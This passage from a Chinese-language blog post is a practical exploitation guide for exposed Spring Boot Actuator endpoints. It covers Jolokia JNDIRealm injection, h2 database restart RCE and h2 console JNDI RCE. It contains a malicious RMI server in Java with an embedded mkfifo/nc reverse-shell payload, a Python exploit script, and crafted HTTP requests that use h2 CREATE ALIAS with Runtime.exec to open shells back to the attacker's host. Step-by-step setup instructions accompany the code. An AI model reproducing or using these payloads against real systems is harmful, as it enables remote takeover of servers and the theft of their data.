<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.249 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">         <span class="comment">//反弹shell地址为192.168.233.249，端口为1234</span></span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;jndi&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用maven对java代码进行编译打包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/d4957a0c50e626f62d06f5fc2853ddbb.png)</p>
<p>使用打包好的jar包-RMIServer-0.1.0.jar指定开启服务的ip地址，运行RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.249 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/22d452ce68c413decf2ec38b91407be8.png)</p>
<p>在kali上使用nc监听1234端口</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/6c60a7d0bba412dd195a483ca8f132df.png)</p>
<p>使用exploit.py脚本对目标进行重放</p>
<p>代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://192.168.233.249:8090/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在kali上使用python运行该脚本，指定目标ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令:python exploit.py http://192.168.233.247:8090</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/9a08beff758b28b994d334ea398a856f.png)</p>
<p>该脚本运行成功后，可以看到kali的nc反弹shell成功</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/f234a703de0dd6e5042e6ee09f60fb1e.png)</p>
<h5 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>创建 JNDIRealm</li>
<li>写入 contextFactory 为 RegistryContextFactory</li>
<li>写入 connectionURL 为你的 RMI Service URL</li>
<li>停止 Realm</li>
<li>启动 Realm 以触发 JNDI 注入</li>
</ul>
<p>详细分析请参见</p>
<p><a target="_blank" rel="noopener" href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
<h4 id="2-6-restart-h2-database-query-RCE"><a href="#2-6-restart-h2-database-query-RCE" class="headerlink" title="2.6.restart h2 database query RCE"></a>2.6.restart h2 database query RCE</h4><h5 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>
<h5 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</strong></p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>
<p>spring 1.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>str1,str2和str3这三个参数组成要执行的命令</strong></p>
<p>spring 2.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;str1&#x27;,&#x27;str2&#x27;,&#x27;str3&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-5"><a href="#利用实例-5" class="headerlink" title="利用实例"></a>利用实例</h5><p>首先判断在/env变量中是否存在h2.database依赖spring.datasource.hikari.connection-test-query</p>
<p>![image-20210830180327037](Spring Boot Actuator未授权访问利用实战利用/image-20210830180327037.png)</p>
<p>构造Post请求/actuator/env设置依赖为需要执行的命令，这里使用的是nc反向连接自己的主机192.168.233.242的1234端口</p>
<p>请求数据包如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T6 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T6(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注:T6这个别名参数，每个参数只能使用一次，每个payload用完后要修改这个别名参数，否则不能执行</strong></p>
<p>![image-20210830180618708](Spring Boot Actuator未授权访问利用实战利用/image-20210830180618708.png)</p>
<p>在自己的主机上使用nc监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>构造请求/actuator/restart数据包，重启</p>
<p>![image-20210830180129484](Spring Boot Actuator未授权访问利用实战利用/image-20210830180129484.png)</p>
<p>重启后，可以看到目标连接成功</p>
<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用/image-20210830181954887.png)</p>
<h5 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
<li>restart 重启应用，会建立新的数据库连接</li>
<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ul>
<p>详细分析参见下文</p>
<p><a target="_blank" rel="noopener" href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
<h4 id="2-7restart-spring-datasource-data-h2-database-RCE"><a href="#2-7restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="2.7restart spring.datasource.data h2 database RCE"></a>2.7restart spring.datasource.data h2 database RCE</h4><h5 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
</ul>
<h5 id="利用方法-8"><a href="#利用方法-8" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：编写sql 文件并托管</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;ip地址&#x27;,&#x27;port&#x27;);</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.datasource.data 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="利用实例-6"><a href="#利用实例-6" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写h2 sql语句,执行nc连接目标主机192.168.233.242的端口1234</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;nc&#x27;,&#x27;192.168.233.242&#x27;,&#x27;1234&#x27;);</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m    SimpleHTTPServer    8080</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求数据包对/actuator/env端点进行请求，设置spring.datasource.data为前面开启http服务的example.sql的url地址</p>
<p>请求报文如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9096</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831171742647](Spring Boot Actuator未授权访问利用实战利用/image-20210831171742647.png)</p>
<p>在调用/actuator/restart端点进行重启springboot项目</p>
<p>![image-20210831173855310](Spring Boot Actuator未授权访问利用实战利用/image-20210831173855310.png)</p>
<p>重启springboot后反弹shell成功</p>
<p>![image-20210830181954887](Spring Boot Actuator未授权访问利用实战利用/image-20210830181954887.png)</p>
<h5 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot-autoconfigure<code>组件中的</code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java<code>文件代码逻辑中会使用</code>runScripts` 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
</ul>
<p>详细漏洞分析参见如下；</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
<h4 id="2-8-h2-database-console-JNDI-RCE"><a href="#2-8-h2-database-console-JNDI-RCE" class="headerlink" title="2.8.h2 database console JNDI RCE"></a>2.8.h2 database console JNDI RCE</h4><h5 id="利用条件-10"><a href="#利用条件-10" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
<li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>
<h5 id="利用方法-9"><a href="#利用方法-9" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：访问路由获得 jsessionid</strong></p>
<p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
<p><strong>步骤二：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：打包JAVA代码</strong></p>
<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：架设恶意 RMI服务</strong></p>
<p>指定开启RMI服务的ip地址，使用下面命令架设对应的 RMI服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：发包触发 JNDI 注入</strong></p>
<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>RMI://your-vps-ip:port/jndi</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=rmi://your-vps-ip:port/jndi&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>



